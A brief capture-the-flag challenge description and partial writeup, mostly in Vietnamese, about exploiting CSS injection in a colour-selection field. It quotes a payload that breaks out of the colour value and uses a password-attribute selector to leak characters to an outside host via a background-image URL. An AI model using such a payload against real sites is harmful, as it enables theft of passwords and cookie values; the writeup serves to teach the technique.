# Mô tả (cung cấp cho CTFer)
Have you heard of CSS injection?
select your favorite color and display on amdin at /admin

## Writeup
trong giao diện được cung cấp bạn có thể thấy rằng có một mục input nơi chúng ta có thể nhập color mình muốn. Ngoài ra còn có một trường ẩn, giá trị của nó được lấy từ cookie.

tìm hiểu trên payload all of thing bạn sẽ thấy payload sau:
blue}; input[type="password"][value^="c"] {background-image: url('https://example.com?c');

